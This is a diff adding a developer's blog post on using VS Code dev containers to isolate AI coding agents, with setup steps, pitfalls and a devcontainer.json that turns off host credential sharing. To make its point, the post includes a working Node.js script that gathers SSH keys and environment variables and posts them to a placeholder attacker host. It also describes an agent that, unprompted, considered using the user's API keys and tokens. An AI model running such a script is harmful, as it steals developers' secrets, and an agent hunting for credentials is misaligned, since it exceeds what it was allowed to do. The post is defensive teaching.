@@ -1,0 +1,279 @@
+---
+meta:
+  title: An introduction to dev containers for agentic software development
+  description: Dev containers are a convenient way to encapsulate an agent in a container. 
+  dateCreated: 2026-11-09
+tags: 
+  - "react"
+  - "testing"
+
+---
+
+import { GithubIssueLinkRsc } from "react-github-permalink/dist/rsc";
+import { ImagePanel } from "@/components/ImagePanel/ImagePanel";
+import deepseekOnHost from "@/assets/deekseek_on_host.jpeg";
+import Image from "next/image";
+
+## Why use dev containers? 
+
+These days for the most part I trust AI on _accuracy_, but not _intent_. 
+
+For example, it's quite common that I'll ask AI to 'What would cause X bug to happen?' and the AI will start making changes to fix the problem, rather than just answering the question'. 
+
+Here is a screenshot of DeepSeek V4.1 Flash in Deepseek Harness running on my host machine. 
+
+<ImagePanel images={{
+    image: <Image src={deepseekOnHost} alt="Expanded 'Think' panel in DeepSeek's harness, reading: 'M1 Pro, 16GB RAM, only 15GB free disk. Downloading a 6GB model + weights is risky with 15GB free. mflux with quantized weights (~4GB for 4-bit flux-schnell) — risky but possible. Generation on M1 Pro 16GB would be slow (~2-5 min/image) and disk space is tight. Not great. Better: ask David about an HF token? A free HF account token would unlock much more ZeroGPU quota (for authenticated users, quota is higher: 5 min/day? Actually authenticated free users get 5 min/day of ZeroGPU). Hmm, that may not be much either. Alternative: use David's OpenAI/other credits if he has any. He has resend config and 1Password app but no op CLI. Given constraints, best move: deliver a strong result now with v1-based art, and mention I can iterate if he wants a different take.'" style={{maxWidth: '100%', height: 'auto'}}/>,
+    caption: "Deepseek considering whether it can find an API Key to perform its task.",
+}}/>
+
+
+
+I had asked it to generate an image for me - an lacking the image generation capability, it starts looking around for tools and API keys to solve this task. 
+
+At this point I stopped the agent, but perhaps its safeguards would have prevented it from doing anything truly nefarious - but it demonstrates a point, these agents have access to your 
+
+### This isn't actually a new problem 
+
+It's actually quite frightening how loosely permissioned software is. 
+
+For example, here is a simple script that grabs all your environment varables and your SSH keys and sends them off the an attacker's service:
+
+```js
+import { readdir, readFile } from "node:fs/promises";
+import { homedir } from "node:os";
+import { join } from "node:path";
+
+const target = "https://malcious-actor.example.com"
+
+async function readFolder(dir) {
+    const entries = await readdir(dir, { withFileTypes: true });
+    const result = {};
+
+    for (const entry of entries) {
+        if (!entry.isFile()) continue;
+        result[entry.name] = await readFile(join(dir, entry.name), "utf8");
+    }
+
+    return result;
+}
+
+async function main() {
+
+    const sshFolder = await readFolder(join(homedir(), ".ssh"))
+    const payload = {
+        ...process.env,
+        sshFolder
+    };
+
+    await fetch(target, {
+        method: 'POST',
+        headers: {
+            'content-type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    });
+
+}
+
+main()
+```
+
+This script could be part of an npm package you installed, with a `postinstall` script, and boom, you're compromised. 
+
+Because we tend to run applications as our own user, those applications have all the same permissions that we do. 
+
+Tools like [Deno help mitigate this](https://docs.deno.com/runtime/fundamentals/security/) any script requires explicit opt in.  
+
+Dev containers have existed to help solve this problem - if you've got some untrusted code, inspect it in a sandbox to limit any impact it can have.
+
+With agentic workflows it's more important than ever to have this security mindedness. In the past, we've been the one conciously making a decision to run a script. With agents, that's no longer the case. 
+
+## Starting a dev container 
+
+Starting a dev container is very straight forward. 
+
+For this purposes of this exercise, create a simple 'console.log('hello world!')' application on github and clone it. 
+
+1. Install Microsoft's Dev Containers extension in VSCode
+2. cmd + shift + n to open a new VSCode window 
+2. cmd + shift + p and "Open folder in container" 
+3. This gives us this series of prompts, note that there can be a few seconds delay between each, and the container itself can take a minute or so to start 
+ 
+
+For our purposes we will select "Add configuration to workspace" and choose the "Alpine" image and no additional tooling. 
+
+This starts our dev container and now we're safely isolated from our host* and  we can use AI inside the dev container. 
+
+*caveats apply - see [[What does work]] below.
+
+
+Observe the file changes you make in the container are still synchronised with what's on the host. It's a docker bind mount. 
+
+"Add configuration to workspace" will add a `.devcontainer` folder to folder you opened. VSCode will use this in future to configure how it opens the .devcontainer. 
+
+For our purposes just use Copilot in VSCode for now.  
+
+Nice and easy so far. 
+
+
+## But: there's a bunch that doesn't work
+
+### 1. We have no tools 
+
+Try run `node` and we'll get a command not found. 
+
+This is because I instructed you to start an Alpine image, that doesn't have anything in it. A more fleshed out image would have node.
+
+The point here is that we are going to need to specify what tools we want available in our container. 
+
+#### Solution 
+
+The dev container can be configured with a Dockerfile, add all requisite tooling there. 
+
+### 2. We have no dotfiles / personal aliases 
+
+A lot of developers, including myself, like to include 'dotfiles' that include shell aliases etc, that are personal to them. You can see [my dotfiles here](https://github.com/dwjohnston/dotfiles).
+
+Developers develop a muscle memory on these aliases and it's disruptive if these go away. 
+
+#### Solution 
+
+Bind mount your dotfiles on the container, and have a container start script evaluate them. 
+
+### 3. We have no extensions 
+
+VSCode will automatically disable extensions for dev containers. They can be reenabled in the extensions menu - though, they'll be disabled again on container rebuilds. 
+
+#### Solution 
+
+`customizations.vscode.extensions` in `.devcontainer/devcontainer.json` allows setting which extensions should be installed.
+
+
+### 4. We lose our AI conversations when we rebuild the container 
+
+Try this. Start a conversation with AI in the container, then cmd + shift +p "Dev Containers: Rebuild container". Note that you've lost your conversation!
+
+This is because by default your chat chat conversations are usually stored in the home directory, 
+
+eg.
+
+- `~/.copilot`
+- `~/.claude` 
+- `~/.codex`
+
+
+#### Solution 
+
+Declare volumes for each of these folders 
+
+### 5. We lose OAuth credentials when we rebuild the container. 
+
+As above. 
+
+#### Solution 
+
+As above. 
+
+
+### 5. We only have access to the one folder 
+
+In real life, often we'll be working on multiple repos at once. The 'open folder in workspace' only will work for a single repo. 
+
+## Solution 
+
+The meta repo. See 
+
+
+### 6. Platform specific node_modules 
+
+If your host is MacOS and your container is linux, and you were to `npm i` a package that has platform specific behaviour - that package will be installed in both the container and host - it's a bind mount. 
+
+When you go to run the application on the host - you'll see an error. 
+
+#### Solution 
+
+Things like node_modules should live in a volume - not a bind mount. 
+
+OR
+
+Abandon the bind mount to host, and have your container always git clone from a remote. 
+
+## But note what _does_ work
+
+Note that you still have git credentials!
+
+If I run `git config --list` I see something like this: 
+
+```
+credential.helper=!f() { /home/vscode/.vscode-server/bin/2c33b50b16c472efe58357d1d2a8a5414bc23fbf/node /tmp/vscode-remote-containers-78dda3a5-a8c3-4cae-b9ad-a9f141af591e.js git-credential-helper $*; }; f
+credential.helper=!f() { /home/vscode/.vscode-server/bin/2c33b50b16c472efe58357d1d2a8a5414bc23fbf/node /tmp/vscode-remote-containers-78dda3a5-a8c3-4cae-b9ad-a9f141af591e.js git-credential-helper $*; }; f
+core.repositoryformatversion=0
+core.filemode=true
+core.bare=false
+core.logallrefupdates=true
+core.ignorecase=true
+core.precomposeunicode=true
+user.name=David Johnston
+user.email=david@blacksheepcode.com
+```
+
+Note the credential helper at the top. 
+
+This is a mechanism that VSCode provides, sharing the git credential from your host into the container. 
+
+If you were to instead ssh into the container, you'll find that the credential helper does not work. 
+
+This is pretty sketchy, in my opinion, and the opinions of others - see this Github Issues thread
+
+<GithubIssueLinkRsc issueLink="https://github.com/microsoft/vscode-remote-release/issues/9466" />
+
+The problem is - a malicious repo could use this credential add malicious code to your codebase. I [demonstrate this here](https://github.com/dwjohnston/target-repo).
+
+### To disable this
+
+In the `devcontainer.json` disable credential sharing in the vscode settings. 
+
+```json 
+  // Avoid using host agent and askpass credentials in VS Code processes.
+  // https://code.visualstudio.com/remote/advancedcontainers/environment-variables
+  "remoteEnv": {
+    "SSH_AUTH_SOCK": null,
+    "GIT_ASKPASS": null,
+    "SSH_ASKPASS": null
+  },
+  "customizations": {
+    "vscode": {
+      "settings": {
+        // Keep the host's Git configuration out of the container.
+        // https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials
+        "dev.containers.copyGitConfig": false,
+        // Prevent Dev Containers from installing its host credential helper.
+        // https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials#_using-a-credential-helper
+        "dev.containers.gitCredentialHelperConfigLocation": "none",
+        // Disable VS Code's askpass helper for Git authentication prompts.
+        // https://github.com/microsoft/vscode/blob/main/extensions/git/package.json#L3957
+        "git.useIntegratedAskPass": false,
+        // Prevent VS Code from injecting Git authentication into terminals.
+        // https://github.com/microsoft/vscode/blob/main/extensions/git/package.json#L3941
+        "git.terminalAuthentication": false,
+
+      },
+    }
+  }
+```
+
+## The Kitchen Sink 
+
+This repo here:
+
+https://github.com/dwjohnston/meta-repo-template
+
+is my metarepo dev container template. 
+
+
+
+
+
+
+
